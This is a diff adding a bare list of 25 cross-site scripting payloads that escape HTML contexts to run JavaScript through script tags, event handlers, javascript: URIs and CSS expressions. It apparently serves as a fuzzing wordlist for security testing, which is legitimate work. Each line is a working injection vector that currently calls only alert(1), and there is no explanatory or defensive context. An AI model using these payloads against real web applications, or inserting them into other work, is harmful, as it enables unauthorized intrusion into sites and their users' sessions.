@@ -1,0 +1,25 @@
+'><script>alert(1)</script>
+"><script>alert(1)</script>
+<script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+<img src=x onerror=alert(1)>
+'><svg/onload=alert(1)>
+"><svg/onload=alert(1)>
+javascript:alert(1)
+'><body onload=alert(1)>
+"><iframe srcdoc="<script>alert(1)</script>">
+'><details open ontoggle=alert(1)>
+"><input onfocus=alert(1) autofocus>
+'><select onfocus=alert(1) autofocus>
+"><textarea onfocus=alert(1) autofocus>
+'><marquee onstart=alert(1)>
+"><a href="javascript:alert(1)">x</a>
+'><math><mi//onmouseover=alert(1)>x
+"><object data=javascript:alert(1)>
+'><embed src=javascript:alert(1)>
+"><link rel=stylesheet href=data:,*%7bx:expression(alert(1))%7d
+'><style>@import'data:text/css,*%7bx:expression(alert(1))%7d';
+"><img src=x onerror=alert`1`>
+'><svg><script>alert(1)</script>
+"><img src=x onerror=alert(String.fromCharCode(49))>
